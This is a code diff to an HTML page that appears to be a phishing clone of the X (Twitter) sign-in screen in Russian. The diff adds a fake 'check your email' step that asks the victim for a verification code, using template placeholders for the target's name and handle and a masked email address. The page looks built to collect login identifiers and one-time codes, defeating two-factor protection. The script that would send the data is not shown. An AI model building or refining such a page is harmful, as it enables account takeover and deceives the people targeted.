@@ -23,7 +23,7 @@
 </head>
 <body class="flex items-center justify-center h-[calc(100vh-64px)] bg-wbg my-8">
 <div class="min-w-[600px] md:min-w-full md:h-screen md:rounded-none bg-white rounded-2xl">
-    <div class="flex flex-col md:h-full">
+    <div style="display: block" id="defaultPage" class="flex flex-col md:h-full">
         <div class="flex items-center h-[53px] px-2">
             <button type="button" title="Закрыть" class="p-2 rounded-full transition duration-300 hover:bg-[#E7E7E8]">
                 <svg class="fill-[#0F1419]" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8.825 10L3.78333 4.96667L4.96667 3.78333L10 8.825L15.0333 3.78333L16.2167 4.96667L11.175 10L16.2167 15.0333L15.0333 16.2167L10 11.175L4.96667 16.2167L3.78333 15.0333L8.825 10Z"/></svg>
@@ -54,9 +54,9 @@
                 </div>
                 <label for="login-input" class="input-wrapper flex items-center my-3 h-[60px] border border-[#dadce0] rounded overflow-hidden">
                     <div class="login-placeholder text-[17px] md:text-[15.5px] text-[#536471] px-2 cursor-text"><span class="md:hidden">Номер телефона, адрес электрон...</span><span class="hidden md:block">Номер телефона, адрес электронной...</span></div>
-                    <div class="login-origin-input flex flex-col justify-center p-2" style="display: none;">
+                    <div class="login-origin-input flex flex-col justify-center w-full p-2" style="display: none;">
                         <span class="text-[13px] text-[#6ABDF5] whitespace-nowrap">Номер телефона, адрес электронной почты ...</span>
-                        <input type="text" id="login-input" class="text-[17px] outline-0">
+                        <input type="text" id="login-input" class="text-[17px] w-full outline-0">
                     </div>
                 </label>
                 <a href="#" class="signin-button flex items-center justify-center h-[36px] my-3 bg-black text-white text-[15px] md:text-sm font-bold rounded-full transition duration-300 hover:bg-[#272C30]">Далее</a>
@@ -66,10 +66,57 @@
                 </div>
             </div>
         </div>
-        <div class="h-[50px] md:hidden"></div>
+        <div class="h-[53px] md:hidden"></div>
+    </div>
+    <div id="globalLoader" class="w-[600px] h-[650px] relative bg-white rounded-2xl" style="display: none;">
+        <svg class="absolute top-[calc(50%-24px)] left-[48%] animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-50" cx="12" cy="12" r="10" stroke="#6ABDF5" stroke-width="4"></circle>
+            <path class="opacity-100" fill="#1D9BF0" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+        </svg>
+    </div>
+    <div id="verifyPage" class="flex flex-col md:h-full" style="display: none;">
+        <div class="flex items-center h-[53px] px-2">
+            <button type="button" title="Закрыть" class="p-2 rounded-full transition duration-300 hover:bg-[#E7E7E8]">
+                <svg class="fill-[#0F1419]" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8.825 10L3.78333 4.96667L4.96667 3.78333L10 8.825L15.0333 3.78333L16.2167 4.96667L11.175 10L16.2167 15.0333L15.0333 16.2167L10 11.175L4.96667 16.2167L3.78333 15.0333L8.825 10Z"/></svg>
+            </button>
+            <div class="flex items-center justify-center grow mr-[34px]">
+                <svg class="fill-[#0F1419]" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M24.3253 3H28.736L19.1 14.0133L30.436 29H21.56L14.608 19.9107L6.65333 29H2.24L12.5467 17.22L1.672 3H10.7733L17.0573 11.308L24.3253 3ZM22.7773 26.36H25.2213L9.44533 5.50133H6.82267L22.7773 26.36Z"/>
+                </svg>
+            </div>
+        </div>
+        <div class="w-[440px] mx-auto my-5">
+            <h1 class="text-[31px] font-bold" style="line-height: 36px">Проверьте свою электронную почту</h1>
+            <div class="mt-2 text-[#536471] text-[15px]">В целях защиты вашей учетной записи от подозрительных действий мы отправили код подтверждения на адрес <span id="change-marker">xo********@g**.***.</span> Чтобы выполнить вход, введите этот код в поле ниже.	</div>
+            <div class="py-3 px-4">
+                <div class="flex items-center">
+                    <div class="mr-3">
+                        <img src="./assets/avatar.png" alt="avatar" class="w-10 h-10 rounded-full">
+                    </div>
+                    <div class="text-[15px]">
+                        <div class="font-bold text-[#0F1419]">Yournick</div>
+                        <div class="text-[#536471]">@yourlinkname</div>
+                    </div>
+                </div>
+            </div>
+            <label for="verify-input" class="verify-wrapper flex items-center my-3 h-[60px] border border-[#dadce0] rounded overflow-hidden">
+                <div class="verify-placeholder text-[17px] md:text-[15.5px] text-[#536471] px-2 cursor-text">Код подтверждения</div>
+                <div class="verify-origin flex flex-col w-full p-2" style="display: none;">
+                    <span class="text-[13px] text-[#6ABDF5]">Код подтверждения</span>
+                    <input oninput="checkVer(this.value)" type="text" id="verify-input" class="text-[17px] flex items-center w-full outline-0">
+                </div>
+            </label>
+            <div class="flex flex-col text-[15px] space-y-4">
+                <a href="#" class="text-[#1D9BF0] hover:underline">Почему у меня запрашивают эту информацию?</a>
+                <a href="#" class="text-[#1D9BF0] hover:underline">Сообщить о проблеме</a>
+            </div>
+        </div>
+        <div class="w-[440px] mx-auto flex items-center justify-center my-6 mt-12">
+            <a href="#" class="success-button disabled flex items-center justify-center w-full h-[50px] bg-black text-[17px] text-white font-bold rounded-full transition duration-300 hover:bg-[#272C30]">Далее</a>
+        </div>
     </div>
 </div>
-<div class="error-message fixed bottom-0 md:w-full bg-[#1D9BF0] text-[15px] md:text-sm text-white p-3 mb-8 md:mb-0 rounded md:rounded-none" style="display: none"><span class="px-3">Мы не смогли найти вашу учетную запись.</span></div>
+<div class="error-message fixed bottom-0 md:w-full bg-[#1D9BF0] text-[15px] md:text-sm text-white p-3 mb-8 md:mb-0 rounded md:rounded-none" style="display: none;"><span class="px-3">Мы не смогли найти вашу учетную запись.</span></div>
 <script src="./assets/script.js"></script>
 </body>
 </html>
